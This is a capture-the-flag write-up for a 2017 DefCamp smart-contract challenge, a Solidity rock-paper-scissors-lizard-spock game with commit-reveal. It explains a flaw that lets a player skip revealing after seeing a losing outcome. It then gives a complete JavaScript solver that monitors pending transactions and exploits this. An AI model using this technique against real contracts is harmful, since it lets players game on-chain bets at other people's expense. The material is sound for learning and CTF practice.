## spock-lizard-omega

### Description
I was thinking that my approach from beta would fix my mistakes from alpha but it seems blockchain is different from traditional programming. However, I've done a bit of research and I'm pretty sure this time you won't break it. Let's see how it goes now. Are you strong enough?

The victim: https://dctf.def.camp/finals-2017-lpmjksalfka/DctfChall3.sol
The API: omegas.dctf-f1nals-2017.def.camp
Transaction API: https://dctf.def.camp/finals-2017-lpmjksalfka/sample3.html

*PS: I've made a cron to reset blockchain so you won't have to wait too much for minning.*

### Author: 
Andrei

### Stats: 
400 points / 0 solvers

### Solution
Based on the challenge description, you receive two APIs with some functionalities such as:
- get_balance: returns the number of ETH a wallet holds
- new_cold_wallet: create a wallet which can be unlocked by a password
- send_money: send eth to other account
- call_contract: call a function from a smart contract
- get_flag: returns the flag if you solved the problem
- get_victim: returns a smart contract address which is supposed to be the target for the game
- play_the_game: a function that spawns a game between a victim smart contract and another player

Looking at the source code of the DctfChall.sol you can see that the smart contract is bassically a game of *rock, paper, scissor, spock, lizard*. It can be played by two players and you can choose one of the 5 options available (from 1 to 5).

The Winner player is decide based on the **getWinner()** function:
```javascript
	function getWinner(uint8 option1, uint8 option2) internal returns (uint8) {
		if(option1 == option2) {
			return 0;
		}

		if(option1 == 0x1) {
			if(option2 == 0x3 || option2 == 0x5) return 1;
			return 2;
		}

		if(option1 == 0x2) {
			if(option2 == 0x1 || option2 == 0x4) return 1;
			return 2;
		}

		if(option1 == 0x3) {
			if(option2 == 0x2 || option2 == 0x5) return 1;
			return 2;
		}

		if(option1 == 0x4) {
			if(option2 == 0x3 || option2 == 0x1) return 1;
			return 2;
		}

		if(option1 == 0x5) {
			if(option2 == 0x4 || option2 == 0x2) return 1;
			return 2;
		}

		return 0;//should never get here
}
```

The goal is to make the **getFlag()** function to answer with *"this guy should receive the reward"* when is being called by the Admin Bot.

``` javascript
function getFlag() 
	onlyIfIsPro
	public
	returns (string)
	{
		return 'this guy should receive the reward';
	}
    
    modifier onlyIfIsPro() {
    	require(solvedHistory[msg.sender] >= 10 && solvedHistory[msg.sender] == triesHistory[msg.sender]);
    	_;
    }
```
As you can see above, this is going to happen only if you win 10 times in a row but never loose a game.

##### The solution
We know than we can "subscribe" to all transactions being made on the blockchain against a specific address by using the API available in the **sample.html**. 
```javascript

$(document).ready(function() {
	client = io.connect('http://45.76.94.172:8080');

	/* receive transactions based on web3.eth.subscribe('pendingTransactions') */
	client.on('transaction', function(data) {
		console.log('transaction', data); 
	});

	client.on('connect', function() {
		console.log('connected');
		client.emit('listen_for', mytarget);
	});
});
```

However, this time there is a significant increase of security measures. For once, we can only send join the game **ONLY before** the bot.

```javascript
modifier onlyValidPlayers() {
    	if(totalplayers == 1) {
    		require(msg.sender != players[totalplayers].addr);
    		require((players[totalplayers].addr == bot && msg.sender != bot) || (players[totalplayers].addr != bot && msg.sender == bot));
    	}
    	_;
    }
```
If that wasn't supposed to be enought, the approach to send the option is totally changed:

Both players need to **first send a nonce of the option** they choosed which is generated with ```keccak256(msg.sender, _opt, _nonce)``` call.

```javascript
function choose(bytes32 _commit) 
	onlyPlaying 
	onlyWithBet
	onlyValidPlayers
	payable
	public {
		require(_commit.length == 32);

		totalplayers                   += 1;
		players[totalplayers].addr     = msg.sender;
		players[totalplayers].invested = msg.value;
		players[totalplayers].commit   = _commit;
		players[totalplayers].showed   = false;

		totalinvested += msg.value;
	}
```

Only after both players sent their nonce, they can **reveal** the real option. The option will be valid if the Smart Contract can recompute the nonce previously sent.

```javascript

	function reveal(uint8 _option, bytes _nonce) 
	onlyWhenPlayed
	isPlaying(msg.sender)
	isValidOption(_option, _nonce)
	public {
		uint p            = getPlayerId(msg.sender);
		players[p].showed = true;
		players[p].option = _option;
	}

    modifier isValidOption(uint8 _opt, bytes _nonce) {
    	uint p = getPlayerId(msg.sender);
    	require(p > 0);
    	require(!players[p].showed && keccak256(msg.sender, _opt, _nonce) == players[p].commit);
    	require(_opt >= 1 && _opt <= 5);
    	_;
    }
```

It is pretty clear that we won't be able to use the previously described attack - [Transaction-Ordering Dependence (TOD) / Front Running](https://consensys.github.io/smart-contract-best-practices/known_attacks/#transaction-ordering-dependence-tod-front-running). 

However, looking closely at the **play()** function, we can see that the Admin will do the following:
- return the invested eth if only one player sent a nonce (Case A)
- return the invested eth if only one player showed the option (Case B)
- send the full bet to the winner if it's not a tie (Case C)

```javascript
	function play() 
	onlyOwner
	public 
	returns (uint8) {
    	//CASE A
		if(totalplayers < 2) {
			if(totalplayers > 0) {
				if(!players[1].addr.send(players[1].invested)) {
					//shit happens
				}
			}
			reset();
			return 0;
		}
 		//CASE B which is vulnerable
		if(!players[1].showed || !players[2].showed) {
			if(!players[1].addr.send(players[1].invested)) {
				//shit happens
			}

			if(!players[2].addr.send(players[2].invested)) {
				//shit happens
			}

			reset();
			return 0;
		}

		//CASE C
		uint8 winner = getWinner(players[1].option, players[2].option);
		triesHistory[players[1].addr] +=1;	
		triesHistory[players[2].addr] +=1;	

		require(totalinvested > 0);

		if(winner != 0) {
			if(!players[winner].addr.send(totalinvested)) {
				//shit happens
			}
			solvedHistory[players[winner].addr] += 1;
		} else {
			
			if(!players[1].addr.send(players[1].invested)) {
				//shit happens
			}

			if(!players[2].addr.send(players[2].invested)) {
				//shit happens
			}
		}
		reset();
		return winner;
	}
```

Looking at this we can see that althought we are unable to win all the time, we can *"forget"* to show the option when we see that the bot **showed** a winning solution. Thus, we will bassically have a *"tie"* when we know for sure that we've lost the game. So we are back to a Frontrunning strategy. 

##### The solver
```html


<html>
<head>

<script src="https://cdn.socket.io/socket.io-1.4.5.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>

var CHOOSE_FUNCTION = '0x7460c747';
var REVEAL_FUNCTION = '0x80c06d70';
var PLAY_FUNCTION   = '0x93e84cd9';

var NOT_PLAYING     = 0;
var PLAYING         = 1;
var REVEALED 		= 2;
var CURRENT_STATUS  = NOT_PLAYING;

var OUR_OPTION      = 0;
//hex encoded 'Vt37gM30Z;/(2oM{j^p(+y.ynNCK/=ws'
//randstr(32); //we don't care too much of our security because the bot is supposedly stupid and wouldn't frontrun us >:)
var OUR_NONCE 		= '0x56743337674d33305a3b2f28326f4d7b6a5e70282b792e796e4e434b2f3d7773'; 
var OUR_COMMITS     = JSON.parse('[null,"0x1de280cb49c7895a387cc2fd7b1d54962838d6329f7b6ded63289561ebb81271","0x5d627d8aeb6e211589af2c0f60563f990ad847bb214ed3350a097f899f47c034","0x8d8aa116cb276cbd9cef6e750ffbb14742e1418fc92e15877345977c2bebe1d4","0x76ba61b495366258d8dcc6a94bc197c583d17a773aa1895df982724146392765","0xfc9f3f104eb4c329e8eab1be4e17a00d9a40018e130fd4a8cc6a8cbf3b1b1345"]');

var client;
var myaddress       = '0x'.toLowerCase();
var mypassword      = 'password';
var mytarget        = '0x'.toLowerCase();

var winners = [
	[0,0,0,0,0,0],
	[0,0,2,1,2,1],
	[0,1,0,2,1,2],
	[0,2,1,0,2,1],
	[0,1,2,1,0,2],
	[0,2,1,2,1,0]
];

var command_params = {
					function:'call_contract',
					abi: '[{"constant":true,"inputs":[],"name":"totalinvested","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"solvedHistory","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"bot","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalplayers","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"minbet","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_commit","type":"bytes32"}],"name":"choose","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"name":"_option","type":"uint8"},{"name":"_nonce","type":"bytes"}],"name":"reveal","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"triesHistory","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"play","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"hasShowed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"reset","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"getFlag","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_minbet","type":"uint256"},{"name":"_bot","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]',
					address: mytarget,
					from: myaddress,
					password: mypassword,
					func:null,
					params:null,
					value:'10000000000000',
					type:'standard',
					gas:'2500000',
					gasPrice: 0};

function randstr(length) {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*()_+{}:\"|<>?/.,;'\\][=-]";
    for(var i = 0; i < length; i++) {
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    return text;
}


$(document).ready(function() {
	client = io.connect('http://108.61.178.190:8080');

	client.on('transaction', function(data) {
		console.log('transaction', data, data.from, myaddress);

		if(CURRENT_STATUS == NOT_PLAYING &&  //not playing
			data.from.toLowerCase() != myaddress.toLowerCase() && //not me
			data.input.indexOf(CHOOSE_FUNCTION) !== -1 //if the bot played something
			) {
			console.log('The bot is playing something.');
			OUR_OPTION = Math.floor((Math.random() * 5) + 1);
			//OUR_COMMIT = web3.utils.soliditySha3({t:'address', v: myaddress}, {t:'uint8', v: OUR_OPTION}, OUR_NONCE);

			console.log('Sending commit option: ', OUR_OPTION);
			
			command_params.func   = 'choose';
			command_params.params = JSON.stringify([OUR_COMMITS[OUR_OPTION]]);
			command_params.value  = '10000000000000';
			
			CURRENT_STATUS = PLAYING;

			$.post('https://omegas.dctf-f1nals-2017.def.camp', command_params, function(data) {
				console.log(data);
			});
		} else if(CURRENT_STATUS == PLAYING && 
			data.from.toLowerCase() != myaddress.toLowerCase() && //not me
			data.input.indexOf(REVEAL_FUNCTION) !== -1 //if the bot revealed something
			) {
			CURRENT_STATUS = REVEALED;
			//input in blockchain is: sha3 of the function (first 8chars) + 256 bits for each param and we only 
			//care of the first param which is bot's options
			var player2_option = 1*data.input[REVEAL_FUNCTION.length + 63]; 
			console.log('The bot revealed his option', player2_option);
			if(winners[player2_option][OUR_OPTION] == 2) {//if our solution is winning
				console.log('For options ', player2_option, OUR_OPTION, ' we won.');
				command_params.func   = 'reveal';
				command_params.params = JSON.stringify([OUR_OPTION, OUR_NONCE]);
				command_params.value  = '0';
				
				$.post('https://omegas.dctf-f1nals-2017.def.camp', command_params, function(data) {
					console.log(data);
				});
			} else {
				console.log('For options ', player2_option, OUR_OPTION, ' we lost.');
				//do nothing and wait for the owner to restart the game for not revealing
			}
		} else if(data.from.toLowerCase() != myaddress.toLowerCase() && //not me
			data.input.indexOf(PLAY_FUNCTION) !== -1 //if play was hit 
			) {
			console.log('Game finished.');
			CURRENT_STATUS = NOT_PLAYING;
			OUR_OPTION     = 0;
		} else {
			//do nothing
		}
	});

	client.on('connect', function() {
		console.log('connected');
		client.emit('listen_for', mytarget);
	});
});
</script>

</head>
<body>
</body>
</html>
```
